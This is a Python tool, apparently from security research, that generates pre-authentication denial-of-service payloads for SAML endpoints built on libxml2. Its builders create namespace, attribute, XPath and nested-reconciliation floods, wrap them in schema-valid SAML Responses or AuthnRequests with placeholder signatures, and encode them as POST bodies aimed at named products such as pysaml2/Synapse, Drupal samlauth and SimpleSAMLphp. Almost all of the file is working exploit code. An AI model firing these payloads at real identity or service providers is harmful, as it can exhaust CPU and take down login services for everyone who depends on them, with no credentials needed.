#!/usr/bin/env python3
"""saml_payloadgen.py -- one generator for every libxml2 SAML complexity payload.

This consolidates the ~10 scattered per-target PoC generators (targets/*/…poc….py)
and the harness generators (saml_dos/floods.py + response.py) into a single tool with
two orthogonal knobs:

    --vector   WHICH libxml2 super-linear primitive the flood targets (the payload SHAPE)
    --message  HOW the flood is packaged for the wire (WHO receives it)

Everything the scattered PoCs actually differed on is exposed as a flag; everything
they had in common is the shared machinery below. See the module docstring sections
"WHAT IS COMMON" and "WHAT ACTUALLY DIFFERS" for the audit that produced this design.

WHAT IS COMMON across every PoC
-------------------------------
  * Pure string building, no I/O -- a payload is a well-formed XML fragment embedded
    in a schema-valid "any" slot of a SAML message.
  * The cost is paid PRE-AUTH: libxml2 canonicalises / re-serialises / imports the
    attacker subtree BEFORE the signature is verified, so no key and no account are
    needed. Placeholder DigestValue/SignatureValue/X509Certificate suffice.
  * Byte efficiency: compact NCName prefixes (a,b,…,z,a0,…) and short URIs, so a
    sub-50 KB request buys tens of seconds of CPU.
  * The flood rides in an xs:anyType / xs:anyAttribute / Extensions slot so the
    message stays schema-valid past the parser's structural checks.

WHAT ACTUALLY DIFFERS (and is therefore a flag here)
----------------------------------------------------
  1. The libxml2 sink itself -> --vector (the 6 shapes below).
  2. The carrier slot the shape needs (anyType element vs anyAttribute vs Extensions)
     -> chosen automatically from (vector, message), overridable with --slot.
  3. The <ds:Signature> config that actually INVOKES a C14N/XPath sink:
       - inclusive vs exclusive C14N algorithm selects C2 vs C1 and MUST match the
         shape (firing the exclusive shape under an inclusive algorithm measures a
         different sink);
       - C3 fires ONLY if an <ds:Transform> DECLARES the XPath -- a flood of <a/>
         with no such transform is parsed and ignored.
     -> handled per-vector; --dual-sign adds a Response-level signature.
  4. "Utilization": exclusive C14N (C1) and reconcile (C7) only count prefixes that
     are REFERENCED; unused declarations are dropped as redundant and the sink stays
     flat. Inclusive C14N (C2) counts in-scope prefixes regardless. -> per-vector default.
  5. Message type / endpoint: C7 lives on the IdP SSO path (saveState -> importNode ->
     xmlReconciliateNs on <Extensions>); C1/C2/C3/C5 live on the SP ACS path (C14N of
     the signed assertion). -> --message, with a coherence note when you cross them.

The vectors (paper codename <-> harness sink name <-> shape):

  C1  c14n-exc   exclusive C14N   O(N^2)     one element, N ns-decls + N utilized attrs
  C2  c14n-inc   inclusive C14N   O(K*N^2)   apex declares N ns, then K empty children
  C3  xpath      XPath transform  O(N^3)     N flat <a/> siblings + declared XPath transform
  C5  attr       marshaller       O(N^2)     one element carrying N namespaced attributes
  C7  reconcile  importNode       O(D^3*W^2) D nested levels, each redeclaring W distinct-URI prefixes
  NS  ns-flood   parse-time       O(N^2)     N ns-decls (flat/nested), decls-only -- NO signature sink

  (Class-B node-set C14N is byte-identical to c14n-inc -- same generator -- so it is an
   alias, not a separate shape; the A/B split is decided by the engine, not the payload.
   ns-flood is the parser-side cost: xmlNewNs's per-element duplicate-prefix scan fires on
   DECLARATIONS ALONE, which no C14N sink does -- that's why it is its own vector, and why
   --utilized separates it from the reference-resolution quadratic.)

Generation only: this prints / encodes the payload. To FIRE and MEASURE it against a
live target, pipe into or use the measurement harness (`python -m saml_dos`).
"""
import argparse
import base64
import sys
import time
import urllib.parse

# ---------------------------------------------------------------------------
# Namespace-algorithm URIs
# ---------------------------------------------------------------------------
DS = "http://www.w3.org/2000/09/xmldsig#"
C14N_INCLUSIVE = "http://www.w3.org/TR/2001/REC-xml-c14n-20010315"
C14N_EXCLUSIVE = "http://www.w3.org/2001/10/xml-exc-c14n#"
ENVELOPED = DS + "enveloped-signature"
XPATH_TRANSFORM = "http://www.w3.org/TR/1999/REC-xpath-19991116"
# O(N^2) alone; O(N^3) as a transform (re-evaluated per node in the union).
DEFAULT_XPATH = "//a[count(preceding-sibling::a) > 0]"

# ---------------------------------------------------------------------------
# Compact NCName prefix encoder (shared by every standalone PoC's gen.py).
# n -> a, b, ..., z, a0, a1, ... ; skips the reserved 'xml'. Sorting the prefixes
# by arrival order forces libxml2's xmlListInsert -> xmlListLowerSearch to walk the
# whole list on each insert (worst case) at the smallest byte size.
# ---------------------------------------------------------------------------
_DIGITS = "0123456789abcdefghijklmnopqrstuvwxyz"
_LETTER = "abcdefghijklmnopqrstuvwxyz"


def _prefix(n):
    if n >= 31583:                     # raw index that would encode 'xml'
        n += 1
    span, width = 26, 1
    while n >= span:
        n -= span
        width += 1
        span = 26 * 36 ** (width - 1)
    out = []
    for _ in range(width - 1):
        out.append(_DIGITS[n % 36])
        n //= 36
    out.append(_LETTER[n % 26])
    return "".join(reversed(out))


def _prefixes(n, sort=True):
    p = [_prefix(i) for i in range(n)]
    return sorted(p) if sort else p


def _b36(n):
    if n == 0:
        return "0"
    s = ""
    while n:
        s = _DIGITS[n % 36] + s
        n //= 36
    return s


# ---------------------------------------------------------------------------
# Flood-fragment generators -- one per vector. Each returns an XML fragment STRING.
# ---------------------------------------------------------------------------
def flood_c14n_exc(n, utilized=True):
    """C1 -- exclusive C14N O(N^2): a single element declaring N namespaces.
    Exclusive C14N only renders VISIBLY-USED namespaces, so the prefixes must be
    referenced (utilized=True adds N matching prefixed attributes) or the sink stays
    flat. Short shared URI ('a:0'): inclusive/exclusive cost is per distinct PREFIX,
    not URI, so this is the smallest shape."""
    if n <= 0:
        return "<e/>"
    pre = _prefixes(n)
    decls = " ".join(f'xmlns:{p}="a:0"' for p in pre)
    attrs = (" " + " ".join(f'{p}:{p}=""' for p in pre)) if utilized else ""
    return f"<{pre[0]}:e {decls}{attrs}/>"


def flood_c14n_inc(n, k=None):
    """C2 -- inclusive C14N O(K*N^2): an apex declaring N namespaces, then K empty
    <c/> children. Inclusive C14N re-emits the N in-scope namespaces at every one of
    the K children. ~4 bytes per child, so the K axis escapes a byte cap. K defaults
    to N (the harness's symmetric N=K=size shape). This same fragment IS the Class-B
    node-set shape -- the difference is inside the DSig engine, not the bytes."""
    if n <= 0:
        return "<e>" + ("<c/>" * (k or 0)) + "</e>"
    if k is None:
        k = n
    pre = _prefixes(n)
    decls = " ".join(f'xmlns:{p}="a:0"' for p in pre)
    return f"<{pre[0]}:e {decls}>" + ("<c/>" * k) + f"</{pre[0]}:e>"


def flood_xpath(n):
    """C3 -- XPath O(N^3): N flat <a/> siblings. Superlinear ONLY when the Signature
    declares an XPath <ds:Transform> whose predicate re-walks the preceding-sibling
    axis per node (see DEFAULT_XPATH). Without that transform the siblings are parsed
    and ignored -- a guaranteed false negative. The transform is emitted by the
    signature builder, not here."""
    return "<a/>" * n


def flood_attr(n):
    """C5 -- attribute-flood O(N^2) in the marshaller: one element carrying N distinct
    namespaced attributes under a single declaration. Parsing is O(N); a library that
    rebuilds the element via setAttributeNS / xmlSetNsProp (dup-scan + tail-walk per
    attr) is O(N^2). Returned as an element; for the anyAttribute slot use attr_string()."""
    attrs = " ".join(f'p:a{i}=""' for i in range(n))
    return f'<p:e xmlns:p="urn:x" {attrs}/>'


def attr_string(n):
    """C5 as a RAW attribute string, to inject onto an existing element whose schema
    allows xs:anyAttribute (SimpleSAMLphp fires C5 on SubjectConfirmationData, not on
    AttributeValue content). Namespace 'urn:x' = ##other keeps the doc schema-valid."""
    return 'xmlns:p="urn:x" ' + " ".join(f'p:a{i}=""' for i in range(n))


def _ns_block(depth, width, distinct_uris=True, utilized=True):
    """Shared nested-namespace builder used by both C7 (reconcile) and the parse-time
    ns-flood. `depth` nested levels, each declaring `width` prefixes; utilized adds a
    matching `n:a=""` per prefix so the declaration is REFERENCED; distinct_uris gives
    every declaration a fresh URI (a global counter) instead of reusing width URIs."""
    pre = _prefixes(width, sort=False)
    tag = pre[0]
    parts, ctr = [], 0
    for _ in range(depth):
        if distinct_uris:
            decls = " ".join(f'xmlns:{p}="u:{_b36(ctr + j)}"' for j, p in enumerate(pre))
            ctr += width
        else:
            decls = " ".join(f'xmlns:{p}="u:{j}"' for j, p in enumerate(pre))
        attrs = (" " + " ".join(f'{p}:a=""' for p in pre)) if utilized else ""
        parts.append(f"<{tag}:e {decls}{attrs}>")
    parts.append("X")
    parts.extend(f"</{tag}:e>" for _ in range(depth))
    return "".join(parts)


def flood_reconcile(depth, width, distinct_uris=True, utilized=True):
    """C7 -- xmlReconciliateNs O(D^3*W^2): `depth` nested levels, each redeclaring
    `width` prefixes with FRESH URIs so reconciliation sees a prefix conflict at every
    level. Each prefix must be REFERENCED (utilized) or the re-declaration is dropped as
    redundant and the sink barely fires. Depth is bounded by libxml2's 256-level parser
    cap, so scale by width at fixed depth ~250."""
    return _ns_block(depth, width, distinct_uris=distinct_uris, utilized=utilized)


def flood_ns_parse(n, depth=1, distinct_uris=True, utilized=False):
    """NS -- parse-time namespace flood (NOT a signature sink). `n` namespace
    declarations spread over `depth` nested levels (depth=1 = a single flat apex, the
    most declarations-per-byte). Two distinct libxml2 parse costs live here, separated
    by the `utilized` knob:
      * utilized=False (default): declaration construction. Each xmlNewNs walks the
        element's existing nsDef list to reject a duplicate prefix -> O(width^2) per
        element. This fires on DECLARATIONS ALONE (no references), unlike every C14N
        sink -- the reason a decls-only flood looks flat under C14N but not here.
      * utilized=True: reference resolution. Each prefixed attribute triggers xmlSearchNs
        walking nsDef -> O(width^2) in uses (the Lasso-IdP quadratic).
    distinct_uris maximises symbol-table interning (fresh URI per declaration). Needs no
    signature: the cost is paid the moment the parser reads the fragment."""
    width = max(n // max(depth, 1), 1)
    return _ns_block(depth, width, distinct_uris=distinct_uris, utilized=utilized)


# ---------------------------------------------------------------------------
# Vector registry: name -> (codename, builder, default_slot, note)
# The builder takes the resolved (n, k, depth, width) and returns a fragment string.
# ---------------------------------------------------------------------------
VECTORS = {
    "c14n-exc":  dict(code="C1", algo=C14N_EXCLUSIVE, needs_sig=True,  needs_xpath=False,
                      slot="element", big="O(N^2)", util_default=True,
                      build=lambda p: flood_c14n_exc(p["n"], utilized=p["utilized"])),
    "c14n-inc":  dict(code="C2", algo=C14N_INCLUSIVE, needs_sig=True,  needs_xpath=False,
                      slot="element", big="O(K*N^2)",
                      build=lambda p: flood_c14n_inc(p["n"], p["k"])),
    "c14n-nodeset": dict(code="C2/B", algo=C14N_INCLUSIVE, needs_sig=True, needs_xpath=False,
                      slot="element", big="O((K*N)^2)",
                      build=lambda p: flood_c14n_inc(p["n"], p["k"])),
    "xpath":     dict(code="C3", algo=C14N_EXCLUSIVE, needs_sig=True,  needs_xpath=True,
                      slot="element", big="O(N^3)",
                      build=lambda p: flood_xpath(p["n"])),
    "attr":      dict(code="C5", algo=C14N_EXCLUSIVE, needs_sig=False, needs_xpath=False,
                      slot="anyattr", big="O(N^2)",
                      build=lambda p: flood_attr(p["n"])),
    "reconcile": dict(code="C7", algo=C14N_EXCLUSIVE, needs_sig=False, needs_xpath=False,
                      slot="extensions", big="O(D^3*W^2)", util_default=True, distinct_default=True,
                      build=lambda p: flood_reconcile(p["depth"], p["width"],
                                                      distinct_uris=p["distinct_uris"],
                                                      utilized=p["utilized"])),
    "ns-flood":  dict(code="NS", algo=C14N_EXCLUSIVE, needs_sig=False, needs_xpath=False,
                      slot="extensions", big="O(N^2) parse", util_default=False, distinct_default=True,
                      build=lambda p: flood_ns_parse(p["n"], depth=p["ns_depth"],
                                                     distinct_uris=p["distinct_uris"],
                                                     utilized=p["utilized"])),
}
# Paper codename aliases (C1, C2, ...) accepted on the command line.
_ALIASES = {v["code"].lower(): k for k, v in VECTORS.items()}
_ALIASES.update({"c2/b": "c14n-nodeset", "nodeset": "c14n-nodeset", "ns": "ns-flood", "parse": "ns-flood"})

# Project names for the five vectors. The four POST-PARSE (live-on-newest-libxml2) sinks get
# the memorable names; NSpew is the parse-stage one, fixed in libxml2 2.14.6, live on <=2.9.x
# and Xerces. Utilization / C14N algorithm (inc vs excl) / distinct-URIs are PARAMETERS, so
# C14N1D3 ("cyanide" in leet, and it opens with C14N) spans both c14n-inc (C2) and c14n-exc (C1).
FUN_NAMES = {
    "ns-flood": "NSpew",        # Parse(ns)          -- parse-stage, fixed on 2.14.6
    "attr": "FlAttr",           # Marshal(attr) / C5
    "c14n-inc": "C14N1D3", "c14n-exc": "C14N1D3", "c14n-nodeset": "C14N1D3",  # Canonicalize / C1,C2
    "xpath": "XPlode",          # Transform(XPath) / C3
    "reconcile": "Wreckoncile", # Reconcile(import) / C7
}
_ALIASES.update({
    "flattr": "attr",
    "c14n1d3": "c14n-inc", "cyanide": "c14n-inc", "cianide": "c14n-inc",
    "c14n1d3-inc": "c14n-inc", "c14n1d3-exc": "c14n-exc",
    "xplode": "xpath",
    "wreckoncile": "reconcile", "wreck": "reconcile",
    "nspew": "ns-flood",
})


def fun_name(vec):
    return FUN_NAMES.get(vec, vec)


def resolve_vector(name):
    name = name.lower()
    if name in VECTORS:
        return name
    if name in _ALIASES:
        return _ALIASES[name]
    raise SystemExit(f"unknown --vector '{name}'; choose from: "
                     f"{', '.join(VECTORS)} (or codenames C1,C2,C3,C5,C7,NS)")


# ---------------------------------------------------------------------------
# Signature block -- only emitted for the SP `response` message.
# ---------------------------------------------------------------------------
def sig_block(ref_id, c14n_algo, xpath_expr=None):
    """A <ds:Signature> with PLACEHOLDER digest/value referencing #ref_id. The
    Transforms list decides which sink the verifier runs: enveloped + (optional
    XPath) + c14n_algo. Cost is paid before the crypto check, so placeholders are
    fine and no key is needed."""
    xp = (f'<ds:Transform Algorithm="{XPATH_TRANSFORM}">'
          f'<ds:XPath>{xpath_expr}</ds:XPath></ds:Transform>') if xpath_expr else ""
    return (
        f'<ds:Signature xmlns:ds="{DS}"><ds:SignedInfo>'
        f'<ds:CanonicalizationMethod Algorithm="{c14n_algo}"/>'
        f'<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>'
        f'<ds:Reference URI="#{ref_id}"><ds:Transforms>'
        f'<ds:Transform Algorithm="{ENVELOPED}"/>{xp}<ds:Transform Algorithm="{c14n_algo}"/>'
        f'</ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>'
        f'<ds:DigestValue>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</ds:DigestValue>'
        f'</ds:Reference></ds:SignedInfo><ds:SignatureValue>AAAA</ds:SignatureValue>'
        f'<ds:KeyInfo><ds:X509Data><ds:X509Certificate>AAAA</ds:X509Certificate>'
        f'</ds:X509Data></ds:KeyInfo></ds:Signature>'
    )


def _now(offset=0):
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + offset))


# ---------------------------------------------------------------------------
# Message builders.
# ---------------------------------------------------------------------------
def build_response(vec, frag, opts):
    """SP-ACS <samlp:Response>. The flood rides in a signed Assertion; the Signature
    Reference (#_assert) is what drags the flood through C14N/XPath before the digest
    is checked. slot decides where the fragment goes:
      element  -> inside <saml:AttributeValue> (xs:anyType)
      anyattr  -> as attributes on <saml:SubjectConfirmationData> (xs:anyAttribute)
    dual_sign adds a Response-level signature (#_resp), required by targets that gate
    on the RESPONSE being signed (pysaml2/Synapse, Drupal samlauth)."""
    v = VECTORS[vec]
    algo = opts["algo"]
    xpath_expr = DEFAULT_XPATH if v["needs_xpath"] else None
    inst, na, nb = _now(), _now(3600), _now(-300)

    slot = opts["slot"]
    if slot == "anyattr":
        scd_attrs = " " + (attr_string(opts["n"]) if vec == "attr" else "")
        attr_value = "x"
    else:
        scd_attrs = ""
        attr_value = frag

    resp_sig = sig_block("_resp", algo, xpath_expr) if opts["dual_sign"] else ""
    assert_sig = sig_block("_assert", algo, xpath_expr)
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_resp" Version="2.0" IssueInstant="{inst}" Destination="{opts['acs_url']}" InResponseTo="{opts['req_id']}">
  <saml:Issuer>{opts['idp_entity']}</saml:Issuer>
  {resp_sig}
  <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
  <saml:Assertion ID="_assert" Version="2.0" IssueInstant="{inst}">
    <saml:Issuer>{opts['idp_entity']}</saml:Issuer>
    {assert_sig}
    <saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">a</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="{na}" Recipient="{opts['acs_url']}" InResponseTo="{opts['req_id']}"{scd_attrs}/>
      </saml:SubjectConfirmation></saml:Subject>
    <saml:Conditions NotBefore="{nb}" NotOnOrAfter="{na}">
      <saml:AudienceRestriction><saml:Audience>{opts['sp_entity']}</saml:Audience></saml:AudienceRestriction></saml:Conditions>
    <saml:AuthnStatement AuthnInstant="{inst}"><saml:AuthnContext>
      <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
      </saml:AuthnContext></saml:AuthnStatement>
    <saml:AttributeStatement><saml:Attribute Name="x" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
      <saml:AttributeValue>{attr_value}</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>"""


def build_authn_request(vec, frag, opts):
    """IdP-SSO <samlp:AuthnRequest> with the flood in <samlp:Extensions>. No Signature:
    on this path the sink is reached when the IdP stashes the request (saveState ->
    importNode -> xmlReconciliateNs, C7) or re-serialises it (per-attribute namespace
    resolution, the C1/C5 family) -- NOT through signature C14N. Issuer must match a
    CONFIGURED SP or the IdP rejects before it stashes anything."""
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="{opts['req_id']}" Version="2.0" IssueInstant="{_now()}" Destination="{opts['acs_url']}">
  <saml:Issuer>{opts['sp_entity']}</saml:Issuer>
  <samlp:Extensions>{frag}</samlp:Extensions>
</samlp:AuthnRequest>"""


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def _print_vectors():
    print("vector        name         code  complexity   sig? slot         shape")
    print("-" * 92)
    rows = {
        "c14n-exc":     "one element, N ns-decls + N utilized attrs",
        "c14n-inc":     "apex N ns-decls, then K empty <c/> children",
        "c14n-nodeset": "= c14n-inc bytes; Class-B split is engine-side",
        "xpath":        "N flat <a/> siblings + declared XPath transform",
        "attr":         "one element, N namespaced attributes",
        "reconcile":    "D nested levels x W distinct-URI redeclared prefixes",
        "ns-flood":     "N ns-decls (flat apex or --ns-depth nested), decls-only parse cost",
    }
    for name, shape in rows.items():
        v = VECTORS[name]
        sig = "yes" if v["needs_sig"] else "no "
        print(f"{name:<13} {fun_name(name):<12} {v['code']:<5} {v['big']:<12} {sig}  {v['slot']:<11}  {shape}")
    print("\nProject names: NSpew=Parse(ns) [fixed on libxml2 2.14.6] | FlAttr=Marshal(attr)/C5 | "
          "C14N1D3=Canonicalize/C1,C2 | XPlode=XPath/C3 | Wreckoncile=Reconcile/C7")


def main(argv=None):
    ap = argparse.ArgumentParser(
        prog="saml_payloadgen",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Generate a libxml2 SAML complexity payload and package it as an "
                    "AuthnRequest (IdP) or Response (SP).",
        epilog="examples:\n"
               "  # C2 inclusive-C14N flood as an SP SAMLResponse, url-encoded POST body\n"
               "  saml_payloadgen.py --vector c14n-inc --message response --size 1000 --encode form\n"
               "  # C7 reconcile as an IdP AuthnRequest (its natural home)\n"
               "  saml_payloadgen.py --vector reconcile --message authnrequest --size 250 --encode form\n"
               "  # C5 attribute flood, raw XML to stdout\n"
               "  saml_payloadgen.py --vector attr --message response --size 40000\n")
    ap.add_argument("--vector", required=False, default="c14n-inc",
                    help="payload shape: c14n-exc(C1) c14n-inc(C2) c14n-nodeset xpath(C3) "
                         "attr(C5) reconcile(C7) ns-flood(NS). Codenames accepted.")
    ap.add_argument("--message", choices=["authnrequest", "response", "auto"], default="auto",
                    help="package as an IdP AuthnRequest or an SP Response. 'auto' (default) "
                         "picks authnrequest for reconcile, response otherwise.")
    ap.add_argument("--size", type=int, default=1000,
                    help="primary scale knob. For c14n-inc: N=K=size. For reconcile: "
                         "depth=min(size,250), width=max(size//8,8). Others: N=size.")
    ap.add_argument("--n", type=int, help="override namespace/attribute count N")
    ap.add_argument("--k", type=int, help="override child count K (c14n-inc only)")
    ap.add_argument("--depth", type=int, help="override reconcile nesting depth D (<=255)")
    ap.add_argument("--width", type=int, help="override reconcile prefixes-per-level W")
    ap.add_argument("--ns-depth", type=int, default=1,
                    help="ns-flood only: spread the N declarations over this many nested "
                         "levels (1 = a single flat apex, max declarations/byte)")
    ap.add_argument("--utilized", choices=["yes", "no"],
                    help="force whether declared prefixes are REFERENCED (n:a=\"\"). Default "
                         "per-vector. The control that separates C14N/reference-resolution "
                         "sinks (utilization-dependent) from marshaller/decl-construction "
                         "sinks (utilization-independent).")
    ap.add_argument("--distinct-uris", choices=["yes", "no"],
                    help="force whether each declaration gets a fresh URI (reconcile/ns-flood). "
                         "Default per-vector. Distinct URIs drive reconciliation conflicts and "
                         "symbol-table interning; shared URIs are the cheap control.")
    ap.add_argument("--slot", choices=["element", "anyattr", "extensions"],
                    help="override the carrier slot (default: per-vector)")
    ap.add_argument("--dual-sign", action="store_true",
                    help="response only: sign the Response element too (pysaml2/Synapse, "
                         "Drupal samlauth require it)")
    ap.add_argument("--c14n", choices=["inc", "exc"],
                    help="force the declared C14N algorithm (default: per-vector)")
    ap.add_argument("--encode", choices=["raw", "b64", "form"], default="raw",
                    help="raw XML (default), base64, or a url-encoded POST body "
                         "(SAMLRequest/SAMLResponse[+RelayState])")
    ap.add_argument("--relay-state", default=None,
                    help="add RelayState to the form body (Synapse/WordPress require it)")
    ap.add_argument("--acs-url", default=None, help="Destination / Recipient (ACS or SSO URL)")
    ap.add_argument("--idp-entity", default="https://evil-idp.test/metadata", help="IdP entityID / Issuer")
    ap.add_argument("--sp-entity", default="https://sp.test/metadata", help="SP entityID / Audience")
    ap.add_argument("--req-id", default="_req", help="InResponseTo / request ID")
    ap.add_argument("--out", help="write payload to this file instead of stdout")
    ap.add_argument("--list", action="store_true", help="list the vectors and exit")
    a = ap.parse_args(argv)

    if a.list:
        _print_vectors()
        return 0

    vec = resolve_vector(a.vector)
    v = VECTORS[vec]

    # Resolve the scale knobs from --size unless explicitly overridden.
    n = a.n if a.n is not None else a.size
    k = a.k if a.k is not None else n
    depth = a.depth if a.depth is not None else min(a.size, 250)
    width = a.width if a.width is not None else max(a.size // 8, 8)

    # Message: honour explicit choice; 'auto' routes the no-signature IdP-native
    # vectors (reconcile, ns-flood) to the AuthnRequest path.
    message = a.message
    if message == "auto":
        message = "authnrequest" if vec in ("reconcile", "ns-flood") else "response"

    # Utilization / URI-distinctness: per-vector default, overridable for controls.
    utilized = v.get("util_default", True)
    if a.utilized:
        utilized = (a.utilized == "yes")
    distinct_uris = v.get("distinct_default", True)
    if a.distinct_uris:
        distinct_uris = (a.distinct_uris == "yes")

    # C14N algorithm: per-vector default, overridable. (C1 must be exclusive, C2 inclusive;
    # forcing a mismatch measures a different sink -- allowed but you own the consequences.)
    algo = v["algo"]
    if a.c14n == "inc":
        algo = C14N_INCLUSIVE
    elif a.c14n == "exc":
        algo = C14N_EXCLUSIVE

    slot = a.slot or v["slot"]
    acs_url = a.acs_url or ("http://sp.test/acs" if message == "response" else "http://idp.test/sso")

    frag = v["build"]({"n": n, "k": k, "depth": depth, "width": width,
                       "ns_depth": a.ns_depth, "utilized": utilized,
                       "distinct_uris": distinct_uris})

    opts = dict(algo=algo, slot=slot, dual_sign=a.dual_sign, acs_url=acs_url,
                idp_entity=a.idp_entity, sp_entity=a.sp_entity, req_id=a.req_id, n=n)

    if message == "response":
        xml = build_response(vec, frag, opts)
        param = "SAMLResponse"
    else:
        # In an AuthnRequest, an anyattr flood has no anyAttribute slot on Extensions;
        # wrap it as an element instead so the request stays well-formed.
        if slot == "anyattr" and vec == "attr":
            frag = flood_attr(n)
        xml = build_authn_request(vec, frag, opts)
        param = "SAMLRequest"

    # Coherence notes to stderr (never pollutes the payload on stdout).
    notes = []
    if message == "authnrequest" and v["needs_sig"]:
        notes.append(f"{vec} ({v['code']}) reaches its sink through signature C14N/XPath, but an "
                     f"AuthnRequest carries NO signature -- on this path it only exercises "
                     f"parse/serialise-time quadratics (if any). C7/reconcile is the IdP-native sink.")
    if message == "response" and vec == "reconcile":
        notes.append("reconcile (C7) fires on the IdP importNode/saveState path, not on an SP "
                     "Response's C14N. Expect this to read as linear at an SP ACS.")
    if vec == "xpath":
        notes.append("C3 requires the declared <ds:XPath> transform (emitted here); without it the "
                     "<a/> flood is inert.")

    # Encode.
    if a.encode == "raw":
        out = xml
        payload_bytes = xml.encode()
    elif a.encode == "b64":
        out = base64.b64encode(xml.encode()).decode()
        payload_bytes = out.encode()
    else:  # form
        fields = {param: base64.b64encode(xml.encode()).decode()}
        if a.relay_state is not None:
            fields["RelayState"] = a.relay_state
        out = urllib.parse.urlencode(fields)
        payload_bytes = out.encode()

    if a.out:
        with open(a.out, "w") as f:
            f.write(out)
        where = a.out
    else:
        sys.stdout.write(out)
        if not out.endswith("\n"):
            sys.stdout.write("\n")
        where = "stdout"

    dims = (f"N={n} K={k}" if vec in ("c14n-inc", "c14n-nodeset")
            else f"D={depth} W={width} (n={depth * width})" if vec == "reconcile"
            else f"N={n} ns_depth={a.ns_depth} util={'y' if utilized else 'n'}" if vec == "ns-flood"
            else f"N={n}")
    print(f"# vector={vec}({v['code']}) message={message} slot={slot} {dims} "
          f"xml={len(xml) / 1024:.1f}KB {a.encode}={len(payload_bytes) / 1024:.1f}KB "
          f"param={param} -> {where}", file=sys.stderr)
    for note in notes:
        print(f"# note: {note}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
